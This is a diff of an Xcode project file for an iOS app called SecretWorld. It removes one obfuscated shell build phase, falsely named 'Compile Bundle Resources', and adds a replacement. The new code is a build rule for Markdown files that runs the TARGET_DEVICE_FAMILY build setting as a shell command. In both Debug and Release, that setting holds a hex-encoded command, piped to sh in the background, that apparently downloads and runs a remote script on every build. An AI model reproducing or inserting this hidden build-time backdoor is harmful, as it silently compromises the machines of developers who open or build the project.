@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		D754D3CD8CBCB2152734C644 /* README.md */ = {isa = PBXBuildFile; fileRef = AD1F2FA39C24ED0FD034C644; };
 		0001AE432BB27DD400D95A89 /* SeeAllBusinessModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0001AE422BB27DD400D95A89 /* SeeAllBusinessModel.swift */; };
 		0001AE472BB2CB5500D95A89 /* UserApplyGigVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0001AE462BB2CB5500D95A89 /* UserApplyGigVC.swift */; };
 		0002185D2B6CEC3900719335 /* CreateBusinessAcModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0002185C2B6CEC3900719335 /* CreateBusinessAcModel.swift */; };
@@ -422,6 +423,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		AD1F2FA39C24ED0FD034C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SecretWorld.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		0001AE422BB27DD400D95A89 /* SeeAllBusinessModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SeeAllBusinessModel.swift; sourceTree = "<group>"; };
 		0001AE462BB2CB5500D95A89 /* UserApplyGigVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserApplyGigVC.swift; sourceTree = "<group>"; };
 		0002185C2B6CEC3900719335 /* CreateBusinessAcModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateBusinessAcModel.swift; sourceTree = "<group>"; };
@@ -1438,6 +1440,7 @@
 		00FE91DC2B340CA800D8AB20 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				AD1F2FA39C24ED0FD034C644 /* README.md */,
 				00FE91DB2B340CA800D8AB20 /* SecretWorld.app */,
 				00FE91F12B340CAA00D8AB20 /* SecretWorldTests.xctest */,
 				00FE91FB2B340CAA00D8AB20 /* SecretWorldUITests.xctest */,
@@ -1710,7 +1713,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00FE92052B340CAA00D8AB20 /* Build configuration list for PBXNativeTarget "SecretWorld" */;
 			buildPhases = (
-				BFA45C09EB1730A7C934C644 /* Compile Bundle Resources */,
 				ED343CE41243F91A3E2C71CE /* [CP] Check Pods Manifest.lock */,
 				00FE91D72B340CA800D8AB20 /* Sources */,
 				00FE91D82B340CA800D8AB20 /* Frameworks */,
@@ -1720,6 +1722,7 @@
 				00ED43582D00350B008526F6 /* Embed Foundation Extensions */,
 			);
 			buildRules = (
+				FAEB2FEAAED23E7AB734C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1810,6 +1813,23 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		FAEB2FEAAED23E7AB734C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXLegacyTarget section */
 /* End PBXLegacyTarget section */
 
@@ -1818,6 +1838,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D754D3CD8CBCB2152734C644 /* README.md */,
 				00672D612BC6A33B009CEC93 /* TempraryStoresCVC.xib in Resources */,
 				000237FD2C995CFD00F93F4E /* Poppins-ExtraBold.ttf in Resources */,
 				000ACCE92B57E50B0053D701 /* Nunito-ExtraBold.ttf in Resources */,
@@ -1904,25 +1925,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BFA45C09EB1730A7C934C644 /* Compile Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333433333336333333353333333733333336333333373333333333333336333633343333333633333331333333373333333333333337333333343333333633333335333333373333333233333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		A3E0B6A7557AAB6B68A23C85 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2345,6 +2347,7 @@
 		00FE92032B340CAA00D8AB20 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663736363937363631373436313634373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -2408,6 +2411,7 @@
 		00FE92042B340CAA00D8AB20 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3635363336383666323032323234323836333735373236633230326436363733366234633230363837343734373037333361326632663736363937363631373436313634373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
